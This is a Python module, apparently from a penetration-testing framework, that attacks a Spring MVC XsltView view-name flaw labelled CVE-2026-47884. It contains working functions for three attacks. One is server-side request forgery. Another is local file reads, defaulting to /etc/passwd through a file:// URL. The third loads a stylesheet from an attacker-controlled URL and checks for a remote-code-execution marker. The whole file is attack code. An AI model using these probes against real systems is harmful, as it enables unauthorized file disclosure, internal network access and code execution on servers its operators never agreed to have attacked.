#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring MVC XsltView SSRF/LFI helpers."""

from __future__ import annotations

import urllib.parse
from typing import Tuple

from core.framework.base_module import BaseModule

XSLT_INDICATORS = (
    "javax.xml.transform",
    "transformerexception",
    "xsltview",
    "stylesheet",
    "saxparseexception",
    "transformerconfigurationexception",
)

RCE_MARKER = "CVE-2026-47884:RCE_MARKER"


class Spring_xslt(BaseModule):
    """CVE-2026-47884 view-name resolution probes."""

    @staticmethod
    def xslt_encode_view(view: str) -> str:
        return urllib.parse.quote(str(view or ""), safe="")

    def xslt_get(self, endpoint: str, view: str) -> Tuple[int, str]:
        ep = endpoint if str(endpoint).startswith("/") else f"/{endpoint}"
        if not ep.endswith("/"):
            ep = ep + "/"
        path = ep + self.xslt_encode_view(view)
        resp = self.http_request("GET", path, timeout=20)
        if not resp:
            return 0, ""
        return int(resp.status_code or 0), (resp.text or "")[:16384]

    def xslt_probe(self, endpoint: str = "/xslt/") -> Tuple[bool, int, str]:
        code, body = self.xslt_get(endpoint, "probe_test_safe")
        low = body.lower()
        hit = any(ind.lower() in low for ind in XSLT_INDICATORS) or code == 500
        return hit, code, body[:500]

    def xslt_ssrf(self, ssrf_url: str, endpoint: str = "/xslt/") -> Tuple[int, str, bool]:
        code, body = self.xslt_get(endpoint, ssrf_url)
        ok = code in (200, 500) and bool(body.strip()) and code != 400
        return code, body[:500], ok

    def xslt_lfi(self, file_path: str, endpoint: str = "/xslt/") -> Tuple[int, str, bool]:
        view = f"file://{str(file_path or '/etc/passwd').lstrip()}"
        code, body = self.xslt_get(endpoint, view)
        ok = code == 200 and (
            "root:" in body or "WINDOWS" in body or len(body) > 50
        )
        return code, body[:500], ok

    def xslt_remote_stylesheet(self, attacker_url: str, endpoint: str = "/xslt/") -> Tuple[int, str, bool]:
        code, body = self.xslt_get(endpoint, attacker_url)
        ok = RCE_MARKER in body or (code in (200, 500) and bool(body.strip()) and code != 400)
        return code, body[:500], ok